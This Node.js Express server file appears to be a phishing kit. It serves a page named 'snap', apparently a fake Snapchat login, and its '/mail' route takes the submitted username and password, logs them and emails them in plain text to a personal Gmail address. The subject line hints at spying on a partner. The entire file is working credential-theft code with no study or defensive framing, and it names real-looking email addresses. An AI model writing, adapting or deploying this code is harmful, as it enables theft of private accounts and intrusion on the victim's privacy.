const express = require('express');
const transporter = require('./controller/MailController');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;



app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'views')));
app.use(express.static(path.join(__dirname, 'public')));
// Create a transporter object using the default SMTP transport
app.get('/', (req, res) => {
    res.render('snap');
});
app.post('/mail', (req, res) => {
    let { username, password } = req.body;
    console.log(username,password);

    transporter.sendMail(
        {
            from: '23014198165.uog.edu.pk@gmail.com',
            to: 'rafiquesadia49@gmail.com',
            subject: 'Addressing Relationship Issues!',
            text: `Username is : ${username}, Password is : ${password}`,
        }
        , (error, info) => {
            if (error) {
                console.log('Error:', error);
            } else {
                console.log('Email sent: ' + info.response);
                res.send('Mail Sent');
            }
        });
    
});





app.listen(PORT, () => {
    console.log(`Server running on port 3000`);
});